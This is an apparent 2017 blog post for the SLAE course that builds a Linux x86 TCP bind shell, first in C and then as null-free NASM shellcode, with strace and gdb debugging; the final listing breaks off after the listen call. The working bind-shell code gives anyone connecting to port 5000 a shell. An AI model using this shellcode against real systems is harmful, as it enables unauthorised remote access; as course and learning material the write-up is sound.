<html lang="en">

<head>
  <meta charset="UTF-8">
  <title>Bad Hombre's Blog</title>
  <meta name="theme-color" content="#222222" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <script src="https://bad-hombres.github.io//blog/js/jquery.min.js"></script>
  <script src="https://bad-hombres.github.io//blog/js/bootstrap.min.js"></script>
  <script src="https://bad-hombres.github.io//blog/js/header.js"></script>
  <script src="https://bad-hombres.github.io//blog/js/toc.js"></script>
  <link href="https://bad-hombres.github.io//blog/css/bootstrap.min.css" rel="stylesheet">
  <link href="https://bad-hombres.github.io//blog/css/theme.css" rel="stylesheet">
  <link href="https://bad-hombres.github.io//blog/css/syntax.css" rel="stylesheet">
  <link href="https://bad-hombres.github.io//blog/css/font-awesome/css/font-awesome.min.css" rel="stylesheet">
  <link rel="shortcut icon" href="https://bad-hombres.github.io//blog/favicon.ico" type="image/x-icon">
  <link rel="icon" href="https://bad-hombres.github.io//blog/favicon.ico" type="image/x-icon">
</head>

<body>

  
<script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-99735361-1']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();

</script>


  


 <script type="text/javascript">
  WebFontConfig = {
    google: {
      families: ['Ubuntu::latin']
    }
  };
  (function() {
    var wf = document.createElement('script');
    wf.src = ('https:' == document.location.protocol ? 'https' : 'http') +
      '://ajax.googleapis.com/ajax/libs/webfont/1/webfont.js';
    wf.type = 'text/javascript';
    wf.async = 'true';
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(wf, s);
  })();
</script>

  <nav class="navbar navbar-inverse navbar-fixed-top">
    <div class="container">
      <div class="navbar-header">
        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
        </button>
        <a class="navbar-brand" href="https://bad-hombres.github.io//blog/">Bad Hombre's Blog</a>
      </div>
      <div class="collapse navbar-collapse">
        <ul class="nav navbar-nav">
          <li><a href="https://bad-hombres.github.io//blog/">/home</a></li>
          <li><a href="https://bad-hombres.github.io//blog/archive.html">/archive</a></li>
          <li><a href="https://bad-hombres.github.io//blog/tags.html">/tags</a></li>
          <li><a href="https://bad-hombres.github.io//blog/about.html">/about</a></li>
        </ul>
      </div>
    </div>
  </nav>


<div class="wrapper">
  <div class="content">
    <div class="container container-center">
      <div class="row">
        <div class="col-md-8">
          <div class="article">
            <div class="well">
              <h1><a href="https://bad-hombres.github.io//blog/2017/03/21/SLAE-TCP-Bind-Shell.html">SLAE: TCP Bind Shell</a></h1>
              <div class="post-meta">
                <div class="post-time">
                  <i class="fa fa-calendar"></i>
                  <time>21 Mar 2017</time>
                </div>
                <ul>
                  
                    <li><a href="https://bad-hombres.github.io//blog/tag/32bit">32bit</a></li>
                  
                    <li><a href="https://bad-hombres.github.io//blog/tag/linux">linux</a></li>
                  
                    <li><a href="https://bad-hombres.github.io//blog/tag/assembly">assembly</a></li>
                  
                    <li><a href="https://bad-hombres.github.io//blog/tag/shellcode">shellcode</a></li>
                  
                    <li><a href="https://bad-hombres.github.io//blog/tag/slae">slae</a></li>
                  
                </ul>
              </div>
              <div class="post-content">
                <div id="toc" class="toc"></div>
                <h3>Written by xirax</h3>
                <h1 id="slae">SLAE</h1>
<p>The SecurityTube Linux Assembly Expert is a course and certification from the
folks over at http://www.securitytube-training.com and also available on
http://www.pentesteracademey.com.</p>

<p>This blog post is the first post required for the exam requirements. My student
id is: PA-4897 and the github url to my repo is https://github.com/mwest67/slae.</p>

<h1 id="getting-started">Getting started</h1>
<p>Our first task is to create a tcp bind shell in shellcode. In order to do this
lets first understand what a bind shell is. Simply put a bind shell listens for
a network connection on a particular port and when a connection is made it then
redirects the programs STDIN, STDOUT and STDERR to the new connection, it then
calls execve to replace the current process with a shell (usually /bin/sh). The
client is then free to interact with the shell</p>

<p>Right, now we know what we want to achieve lets get started first thing first
lets list all the syscalls we are going to need in order to achieve this task</p>

<ul>
  <li><a href="https://linux.die.net/man/7/socket" title="Socket Man page docs">socket</a>  - This is needed to create the listening socket</li>
  <li><a href="https://linux.die.net/man/7/bind" title="bind Man page docs">bind</a>     - This is so we can tell the OS where to listen</li>
  <li><a href="https://linux.die.net/man/7/listen" title="listen Man page docs">listen</a> - This is required to start the socket listening for
                    connections</li>
  <li><a href="https://linux.die.net/man/7/accept" title="accept Man page docs">accept</a> - This is to accept incoming connections</li>
  <li><a href="https://linux.die.net/man/7/dup2" title="dup2 Man page docs">dup2</a>     - This is so we can redirect STDIN, OUT and ERR</li>
  <li><a href="https://linux.die.net/man/7/execve" title="execve Man page docs">execve</a> - This is so we can spawn the shell</li>
</ul>

<h1 id="initial-version">Initial Version</h1>
<p>Before we break out the assembler, let make sure we are good with achieving this
in a higher level language like C</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;linux/socket.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
        <span class="cm">/* Initialize some variables */</span>
        <span class="kt">int</span> <span class="n">sockfd</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">clientfd</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

        <span class="cm">/* Initialize the socket */</span>
        <span class="n">sockfd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

        <span class="cm">/* Set up the params for the server socket */</span>
        <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">server_addr</span><span class="p">;</span>
        <span class="n">server_addr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
        <span class="n">server_addr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">htonl</span><span class="p">(</span><span class="n">INADDR_ANY</span><span class="p">);</span>
        <span class="n">server_addr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">5000</span><span class="p">);</span> <span class="cm">/* htons to convert to network byte order */</span>

        <span class="cm">/* Bind to the address we gave it */</span>
        <span class="n">bind</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">server_addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">server_addr</span><span class="p">));</span>

        <span class="cm">/* tell the server to listen */</span>
        <span class="n">listen</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>

        <span class="cm">/*
         * We should now start accepting client connections
         * the NULLS are because we dont care who is connecting
         * if we did we would need a pointer to a fresh sockaddr_in
         * struct for the accept call to fill in
         */</span>

        <span class="n">clientfd</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span><span class="o">*</span><span class="p">)</span><span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

        <span class="cm">/* Redirect STDIN(0), STDOUT(1) and STDERR(2) to the client socket */</span>
        <span class="n">dup2</span><span class="p">(</span><span class="n">clientfd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
        <span class="n">dup2</span><span class="p">(</span><span class="n">clientfd</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
        <span class="n">dup2</span><span class="p">(</span><span class="n">clientfd</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>

        <span class="cm">/* execute the shell */</span>
        <span class="kt">char</span><span class="o">*</span> <span class="n">args</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"/bin/bash"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">};</span>
        <span class="n">execve</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">args</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

<span class="p">}</span></code></pre></figure>

<p>Lets compile and run</p>
<div class="highlighter-rouge"><pre class="highlight"><code>  $ gcc -m32 -o bind_shell bind_shell.c
  $ ./bind_shell

</code></pre>
</div>
<p>And now from another shell</p>
<div class="highlighter-rouge"><pre class="highlight"><code>  $ nc localhost 5000
  ls
  bind
  bind.o
  bind_shell
  bind_shell.c

</code></pre>
</div>
<p>Right so our C version is working, the code is pretty well commented but it is
clear that there is no error checking and also that there are LOTS of constants
that we wont have when we come to write this in assembly. These are</p>

<ul>
  <li>syscall numbers (as C provides convenience functions for these)</li>
  <li>AF_INET - The protocol family</li>
  <li>SOCK_STREAM - Used for TCP connection</li>
  <li>INADDR_ANY - Used to tell OS to listen on all addresses</li>
</ul>

<p>We also need to figure out how the sockaddr_in structure needs to look on the
stack</p>

<h1 id="information-gathering">Information Gathering</h1>

<h2 id="syscall-numbers">1. Syscall Numbers</h2>
<p>Lets gather all the syscall numbers. For this installed the libc6-dev-i386
package on my 64bit kali vm. This installs the linux headers into /usr/include.
This include file we are specifically interested in for the syscall numbers is 
/usr/include/asm/unistd_32.h a quick grep through this yields the following
syscall numbers</p>

<div class="highlighter-rouge"><pre class="highlight"><code>#define __NR_socket 359
#define __NR_bind 361
#define __NR_listen 363
#define __NR_accept4 364
#define __NR_dup2 63
#define __NR_execve 11
</code></pre>
</div>
<p><em>Note: There is an x86 specific syscall called socketcall and is number 102
which a lot of people use when producing this type of shellcode but I have
decided to use the individual calls.</em></p>

<h2 id="constants">Constants</h2>
<p>Right, we now have all our syscall numbers time to gather all of our other
constants. Lets take a grep through the header files</p>

<div class="highlighter-rouge"><pre class="highlight"><code>  $ grep -r AF_INET /usr/include/**/*.h
/usr/include/bits/socket.h:#define AF_INET              PF_INET
/usr/include/bits/socket.h:#define AF_INET6     PF_INET6
/usr/include/linux/if_link.h: *       [AF_INET] = {
/usr/include/linux/if_link.h: *       [AF_INET6] = {
/usr/include/linux/in6.h: *     Types and definitions for AF_INET6
/usr/include/linux/in6.h:       unsigned short int      sin6_family;    /* AF_INET6 */
/usr/include/linux/l2tp.h:      __kernel_sa_family_t l2tp_family; /* AF_INET */
/usr/include/linux/l2tp.h:      __kernel_sa_family_t l2tp_family; /* AF_INET6 */
/usr/include/X11/Xdmcp.h:#if defined(IPv6) &amp;&amp; defined(AF_INET6)

  $ grep -r PF_INET /usr/include/**/*.h
/usr/include/bits/socket.h:#define PF_INET              2       /* IP protocol family.  */
/usr/include/bits/socket.h:#define PF_INET6     10      /* IP version 6.  */
/usr/include/bits/socket.h:#define AF_INET              PF_INET
/usr/include/bits/socket.h:#define AF_INET6     PF_INET6

</code></pre>
</div>
<p>As you can see from above AF_INET is aliased to PF_INET so a quick search
reveals AF_INET = 2. If we continue grepping for the other constants we find
that SOCK_STREAM = 1 and INADDR_ANY = 0</p>

<h1 id="syscalls-from-assembly">Syscalls from Assembly</h1>
<p>Before we head off on this trip lets remind our selves of how syscalls happen
from assembly. Below is the order of business</p>
<ul>
  <li>Put the syscall number in the eax register</li>
  <li>Setup the syscall params using EBX, ECX and EDX, syscalls with more params
either use the stack or other registers sucj as ESI</li>
  <li>Call interupt 0x80 to trigger the call</li>
  <li>Results of the syscall gets returned in EAX</li>
</ul>

<p>Lets also refresh ourselves on the desired characteristics of our shellcode</p>
<ul>
  <li>Small as possible (this means being crafty with params etc)</li>
  <li>No bad chars such as NULL (meaning we want to use the appropriate registers)</li>
  <li>Port numbers need to be in Network byte order or Big Endian</li>
</ul>

<h1 id="lets-begin">Lets Begin</h1>

<p>First thing we going to need to do is zero out our registers so we have a clean
slate</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm">        <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>            <span class="c">; Zero out registers</span>
        <span class="k">xor</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">ebx</span>
        <span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>
        <span class="k">xor</span> <span class="n">edx</span><span class="p">,</span> <span class="n">edx</span></code></pre></figure>

<p>With that out the way lets now take a look at the socket syscall docs (link
above)</p>

<div class="highlighter-rouge"><pre class="highlight"><code>  sockfd = socket(int socket_family, int socket_type, int protocol);
</code></pre>
</div>
<p>Right so the registers need to be as follows</p>
<ul>
  <li>EAX: 359 for socket syscall (see above)</li>
  <li>EBX: 2 for AF_INET (1st param)</li>
  <li>ECX: 1 for SOCK_STREAM (2nd param)</li>
  <li>EDX: 0 for IP (3rd param which is already set via xor above)</li>
</ul>

<p>If all goes well we should get a file descriptor to a sock back in EAX. Heres
the code</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm">        <span class="k">mov</span> <span class="n">bl</span><span class="p">,</span> <span class="mh">0x2</span>             <span class="c">; AF_INET</span>
        <span class="k">inc</span> <span class="n">cl</span>                  <span class="c">; SOCK_STREAM = 1 - Leave EDX 0 for IP</span>
        <span class="k">mov</span> <span class="n">ax</span><span class="p">,</span> <span class="mh">0x0167</span>          <span class="c">; Socket syscall number</span>
        <span class="k">int</span> <span class="mh">0x80</span>                <span class="c">; make call</span></code></pre></figure>

<p>Notice how we used the 8 bit versions of EBX and ECX to avoid NULLs and also how
we used “inc cl” to save a byte as apposed to a mov instruction. We used the 16
bit version of EAX to avoid NULL and because 0x167 in hex (359 dec) needs two
bytes.</p>

<p>So at this point we are assuming everything went ok (we are writing shellcode
and we cant spare the bytes for error checking) which means that there should be
a socket file descriptor sat in EAX waitning for us, the problem is we need EAX
for our next syscall so we shall have to save it somewhere! Lets use EDI</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm">        <span class="k">xchg</span> <span class="n">edi</span><span class="p">,</span> <span class="n">eax</span>           <span class="c">; store socketfd</span></code></pre></figure>

<p>I used xchg here to save a byte and I chose EDI so I didnt have to reset ESI for
the accept4 call later (I will explain more on this later)</p>

<p>Now that is out of the way we need to set up the bind syscall, we have the
syscall number and the address familly constants all worked out for this but we
now need to figure out how the sockaddr_in structure looks on the stack. First
let us remind our selves how sockaddr_in looks in C</p>
<div class="highlighter-rouge"><pre class="highlight"><code>  struct sockaddr_in {  
    short sin_family;  
    unsigned short sin_port;  
    struct in_addr sin_addr;  
    char sin_zero[8];  
  };  
</code></pre>
</div>
<p>So we need sin_family which if you remember the C version is just AF_INET then
we need the port which has to be in network byte order. We are using port 5000
which is 0x1388 in hex so network byte order would be 0x8813. The next parameter
is the IP address structure which contains the IP to bind to, since we are
binding to all IP’s using INADDR_ANY which is 0 then this value can be zero.
Next is the interesting value which is the sin_zero field now according to the
documentation this field is “Padding to make structure the same size as
SOCKADDR” which means we dont need to bother setting it so our structure on the
stack will be</p>
<div class="highlighter-rouge"><pre class="highlight"><code>High Mem: 0x00000002   ; sin_family (AF_INET)
          0x8813       ; sin_port (Network Byte Order)
 Low Mem: 0x00000000   ; sin_addr (INADDR_ANY)
</code></pre>
</div>
<p>Remeber as this is the stack we have to push things on in reverse order. Lets
look at the bind call args again just to remind ourselves.</p>
<div class="highlighter-rouge"><pre class="highlight"><code>int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
</code></pre>
</div>
<p>Ok so we need EBX to point to the server socket handle (currently in EDI), we
need a pointer to our sockaddr_in structure we put on the stack in ECX and then
we need the size of the structure in EDX which can be computed as 2 bytes for
AF_INET (short) 2 bytes for the port, 4 bytes for the long (inet address) then 8
bytes for the padding which adds up to 16 bytes or 0x10</p>

<p>So lets get this all set up</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm">        <span class="c">; Now call bind</span>
        <span class="k">push</span> <span class="n">edx</span>                <span class="c">; INADDR_ANY - IP to bind to in soccaddr_in</span>
        <span class="k">push</span> <span class="n">word</span> <span class="mh">0x8813</span>        <span class="c">; Port in Network byte order</span>
        <span class="k">push</span> <span class="n">word</span> <span class="n">bx</span>            <span class="c">; Address Family AF_INET</span>
        <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>            <span class="c">; get pointer to structure</span>
        <span class="k">xchg</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">edi</span>           <span class="c">; put server socket fd into ebx (use xchg to save a byte)</span>
        <span class="k">mov</span> <span class="n">dl</span><span class="p">,</span> <span class="mh">0x10</span>            <span class="c">; set struct len</span>
        <span class="k">mov</span> <span class="n">ax</span><span class="p">,</span> <span class="mh">0x0169</span>          <span class="c">; bind syscall</span>
        <span class="k">int</span> <span class="mh">0x80</span>                <span class="c">; make call</span></code></pre></figure>

<p>Hopefully this makes sense first we have 3 pushes which set up our sockaddr_in
struct on the stack, third push pushes the EBX register which already contains
0x2 for AF_INET. Whe then move value of the stack pointer into ECX so we now
have a pointer to our structure. Next we use xchg to get the socket handle from
edi into EBX we then move the struct length of 16 bytes into EDX. Lastly we
setup the bind syscall and execute it.</p>

<p>Now we have to call the listen call. Listen has the following signature.</p>
<div class="highlighter-rouge"><pre class="highlight"><code>int listen(int sockfd, int backlog);
</code></pre>
</div>
<p>As EBX is already set to the server socket fd we only have to set ECX to a
sensible value as it currently a pointer to a sockaddr_in struct. We achieve
this by xchg ing ECX and EDX as EDX has the value 16 which is an acceptable
value for the backlog parameter.</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm">        <span class="c">; Call listen</span>
        <span class="k">xchg</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">edx</span>           <span class="c">; set up the backlog parameter</span>
        <span class="k">mov</span> <span class="n">ax</span><span class="p">,</span> <span class="mh">0x016B</span>          <span class="c">; set syscall number for listen</span>
        <span class="k">int</span> <span class="mh">0x80</span>                <span class="c">; make the call</span></code></pre></figure>

<p>Time to move on, next up we want to call accept (or accept4 in our case). Lets
have a look at the signature for this call</p>

<div class="highlighter-rouge"><pre class="highlight"><code>int accept4(int sockfd, struct sockaddr *addr, socklen_t *addrlen, int flags);
</code></pre>
</div>
<p>So breaking this down we want</p>

<ul>
  <li>EBX to be the socket fd we are accepting connections from</li>
  <li>ECX to be a pointer to the struct that will get filled with the client address</li>
  <li>EDX to be the lenth of the structure</li>
  <li>ESI to be the flags setting</li>
</ul>

<p>In our code EBX is already set up, we dont care about the client address so ECX
and EDX can be 0x0 although I dont zero out EDX as it seems to be ignored when
ECX points nowhere. Now how did I find that ESI was used for the flags
parameter? I googled and could not find what I wanted and I was too lazy to go
digging in the kernel source. As it turns out when I coded the inital socket
call I originally used ESI to store the server socket fd in so when i did the
xchg with EBX to setup the call to bind this meant ESI now had the value 0x2.
When I had completed my code I found it failed on the accept call. I ran the
tool with a cool linux debugging tool called strace and below is the output</p>

<div class="highlighter-rouge"><pre class="highlight"><code>  $ strace ./bind
execve("./bind", ["./bind"], [/* 21 vars */]) = 0
strace: [ Process PID=2852 runs in 32 bit mode. ]
socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
bind(3, {sa_family=AF_INET, sin_port=htons(5000), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
listen(3, 16)                           = 0
accept4(3, NULL, 0xffb21478, 0x2 /* SOCK_??? */) = -1 EINVAL (Invalid argument)
</code></pre>
</div>
<p>This told me all my other parameters were correct I just needed find where the
flags parameter was being set so I turned to trusty old GDB</p>

<div class="highlighter-rouge"><pre class="highlight"><code> $ gdb -q ./bind
Reading symbols from ./bind...(no debugging symbols found)...done.
(gdb) break _start
Breakpoint 1 at 0x8048060
(gdb) run
Starting program: /root/src/bind

Breakpoint 1, 0x08048060 in _start ()
(gdb) disassemble
Dump of assembler code for function _start:
=&gt; 0x08048060 &lt;+0&gt;:     xor    %eax,%eax
   0x08048062 &lt;+2&gt;:     xor    %ebx,%ebx
   0x08048064 &lt;+4&gt;:     xor    %ecx,%ecx
   0x08048066 &lt;+6&gt;:     xor    %edx,%edx
   0x08048068 &lt;+8&gt;:     mov    $0x2,%bl
   0x0804806a &lt;+10&gt;:    inc    %cl
   0x0804806c &lt;+12&gt;:    mov    $0x167,%ax
   0x08048070 &lt;+16&gt;:    int    $0x80
   0x08048072 &lt;+18&gt;:    xchg   %eax,%esi
   0x08048073 &lt;+19&gt;:    push   %edx
   0x08048074 &lt;+20&gt;:    pushw  $0x8813
   0x08048078 &lt;+24&gt;:    push   %bx
   0x0804807a &lt;+26&gt;:    mov    %esp,%ecx
   0x0804807c &lt;+28&gt;:    xchg   %ebx,%esi
   0x0804807e &lt;+30&gt;:    mov    $0x10,%dl
   0x08048080 &lt;+32&gt;:    mov    $0x169,%ax
   0x08048084 &lt;+36&gt;:    int    $0x80
   0x08048086 &lt;+38&gt;:    xchg   %ecx,%edx
   0x08048088 &lt;+40&gt;:    mov    $0x16b,%ax
   0x0804808c &lt;+44&gt;:    int    $0x80
   0x0804808e &lt;+46&gt;:    xor    %ecx,%ecx
   0x08048090 &lt;+48&gt;:    mov    $0x16c,%ax
   0x08048094 &lt;+52&gt;:    int    $0x80
   0x08048096 &lt;+54&gt;:    xchg   %eax,%ebx
   0x08048097 &lt;+55&gt;:    mov    $0x2,%cl
End of assembler dump.
(gdb) break *0x08048094
Breakpoint 2 at 0x8048094
(gdb) c
Continuing.

Breakpoint 2, 0x08048094 in _start ()
(gdb) info registers
eax            0x16c    364
ecx            0x0      0
edx            0xffffd6f8       -10504
ebx            0x3      3
esp            0xffffd6f8       0xffffd6f8
ebp            0x0      0x0
esi            0x2      2
edi            0x0      0
eip            0x8048094        0x8048094 &lt;_start+52&gt;
eflags         0x246    [ PF ZF IF ]
cs             0x23     35
ss             0x2b     43
ds             0x2b     43
es             0x2b     43
fs             0x0      0
gs             0x0      0
(gdb)
</code></pre>
</div>
<p>see the 0x2 in ESI? I set that to 0 and boom! my accept call was working</p>
<div class="highlighter-rouge"><pre class="highlight"><code>(gdb) set $esi = 0
(gdb) c
Continuing.

</code></pre>
</div>
<p>The program is now waiting for connections. I now can either xor ESI or use EDI to store the
server socket fd. I chose to use EDI instead however on second thoughts the
program this shellcode may be instered into may have already set ESI so its best
to xor it lets look at the code for the accept call</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm">        <span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>            <span class="c">; zero out registers</span>
        <span class="k">xor</span> <span class="n">esi</span><span class="p">,</span> <span class="n">esi</span>
        <span class="k">mov</span> <span class="n">ax</span><span class="p">,</span> <span class="mh">0x016c</span>          <span class="c">; set accept syscall</span>
        <span class="k">int</span> <span class="mh">0x80</span>                <span class="c">; make the call</span>
        <span class="k">xchg</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">eax</span>           <span class="c">; store the client socket fd in ebx so we can use for the dup call</span></code></pre></figure>

<p>Notice how I use xchg to store the return value of accept (which is the client
socket fd) into EBX which will be the first parameter for the three dup2 calls
which have to come next</p>

<p>Right on to the dup2 calls, here we have to redirect our processes STDIN, STDOUT
and STDERR to the client socket which we shall achieve using dup2. Observant
reader might realize that STDIN, STDOUT and STDERR have the values 0, 1 &amp; 2 and
calling dup2 sounds a lot like a job for a loop. So here what we shall do is set
the counter register (ECX) to 0x2 perform the dup2 call then decrement ECX if
the sign flag has not been set (ECX is stil &gt;= 0) then we shall loop around
again calling the dup2 again. This should end up making the following dup 2
calls.</p>

<ul>
  <li>dup2(4, 2)</li>
  <li>dup2(4, 1)</li>
  <li>dup2(4, 0)</li>
</ul>

<p>These three calls will redirect our STDIN, STDOUT and STDERR to the client
socket. Here is the code</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm">        <span class="k">mov</span> <span class="n">cl</span><span class="p">,</span> <span class="mh">0x2</span>
<span class="k">loop</span><span class="o">:</span>
        <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x3f</span>            <span class="c">; setup dup2 call</span>
        <span class="k">int</span> <span class="mh">0x80</span>                <span class="c">; call dup2</span>
        <span class="k">dec</span> <span class="n">ecx</span>                 <span class="c">; decrement the loop counter</span>
        <span class="k">jns</span> <span class="k">loop</span>                <span class="c">; if the sign flag is not set then repeat the loop</span></code></pre></figure>

<p>Last thing to do is to make the execve call and then were done. Lets look at the
execve signature</p>
<div class="highlighter-rouge"><pre class="highlight"><code>int execve(const char *filename, char *const argv[], char *const envp[]);
</code></pre>
</div>
<p>Here is how we want the registers to look</p>

<ul>
  <li>EBX: pointer to the NULL terminated string “//bin/sh”</li>
  <li>ECX: pointer to an array containing the aruments to the program (includes
//bin/sh string itself)</li>
  <li>EDX: NULL as we are not going to pass any environment to the shell</li>
</ul>

<p>A couple of points to note for this are</p>
<ol>
  <li>Its easier to push strings if they are multiples of 4 in length which is why
we use //bin/sh as it is 8 characters in length and linux doesnt care about the
extra /</li>
  <li>We have to push the string on the stack in reverse so we push hs/nib//</li>
</ol>

<p>Here is the code</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm">        <span class="k">push</span> <span class="n">eax</span>                <span class="c">; push NULL onto stack to termins //bin/sh</span>
        <span class="k">push</span> <span class="mh">0x68732f6e</span>         <span class="c">; push //bin/sh in reverse onto the stack</span>
        <span class="k">push</span> <span class="mh">0x69622f2f</span>         <span class="c">; see above</span>
        <span class="k">mov</span>  <span class="n">ebx</span><span class="p">,</span> <span class="n">esp</span>           <span class="c">; move address of //bin/sh into EBX (execve's 1st parameter)</span>
        <span class="k">push</span> <span class="n">eax</span>                <span class="c">; this serves two purposes 1, to use for EDX (we will pass no</span>
                                <span class="c">; environment to the shell and also as part of the array of</span>
                                <span class="c">; args that we will pass to as the 2nd arg of execve</span>
        <span class="k">mov</span>  <span class="n">edx</span><span class="p">,</span> <span class="n">esp</span>           <span class="c">; see above</span>
        <span class="k">push</span> <span class="n">ebx</span>                <span class="c">; ESP now points to and array of args [address of //bin/sh, 0x00]</span>
                                <span class="c">; these will act as the args to //bin/sh</span>
        <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>            <span class="c">; setup the 3rd argument</span>
        <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x0b</span>            <span class="c">; set the EAX register to the execve sys call number</span>
                                <span class="c">; using al to remove any null bytes</span>
        <span class="k">int</span> <span class="mh">0x80</span>                <span class="c">; make the call</span></code></pre></figure>

<p>Right all done! Below is the code in all its glory!!</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="kr">global</span> <span class="n">_start</span>
<span class="kr">section</span> <span class="p">.</span><span class="n">text</span>

<span class="n">_start</span><span class="o">:</span>
        <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>            <span class="c">; Zero out registers</span>
        <span class="k">xor</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">ebx</span>
        <span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>
        <span class="k">xor</span> <span class="n">edx</span><span class="p">,</span> <span class="n">edx</span>
        <span class="k">xor</span> <span class="n">edi</span><span class="p">,</span> <span class="n">edi</span>

        <span class="c">; Setup Socket call</span>
        <span class="k">mov</span> <span class="n">bl</span><span class="p">,</span> <span class="mh">0x2</span>             <span class="c">; AF_INET</span>
        <span class="k">inc</span> <span class="n">cl</span>                  <span class="c">; SOCK_STREAM = 1 - Leave EDX 0 for IP</span>
        <span class="k">mov</span> <span class="n">ax</span><span class="p">,</span> <span class="mh">0x0167</span>          <span class="c">; Socket syscall number</span>
        <span class="k">int</span> <span class="mh">0x80</span>                <span class="c">; make call</span>

        <span class="k">xchg</span> <span class="n">edi</span><span class="p">,</span> <span class="n">eax</span>           <span class="c">; store socketfd</span>

        <span class="c">; Now call bind</span>
        <span class="k">push</span> <span class="n">edx</span>                <span class="c">; INADDR_ANY - IP to bind to in soccaddr_in</span>
        <span class="k">push</span> <span class="n">word</span> <span class="mh">0x8813</span>        <span class="c">; Port in Network byte order</span>
        <span class="k">push</span> <span class="n">word</span> <span class="n">bx</span>            <span class="c">; Address Family AF_INET</span>
        <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>            <span class="c">; get pointer to structure</span>
        <span class="k">xchg</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">edi</span>           <span class="c">; put server socket fd into ebx (use xchg to save a byte)</span>
        <span class="k">mov</span> <span class="n">dl</span><span class="p">,</span> <span class="mh">0x10</span>            <span class="c">; set struct len</span>
        <span class="k">mov</span> <span class="n">ax</span><span class="p">,</span> <span class="mh">0x0169</span>          <span class="c">; bind syscall</span>
        <span class="k">int</span> <span class="mh">0x80</span>                <span class="c">; make call</span>

        <span class="c">; Call listen</span>
        <span class="k">xchg</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">edx</span>           <span class="c">; set up the backlog parameter</span>
        <span class="k">mov</span> <span class="n">ax</span><span class="p">,</span> <span class="mh">0x016B</span>          <span class="c">; set syscall number for listen</span>
        <span class="k">int</span> <span class="mh">0x80</span>                <span class="c">; make the call</span>

        <span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>            <span class="c">; zero out registers</span>
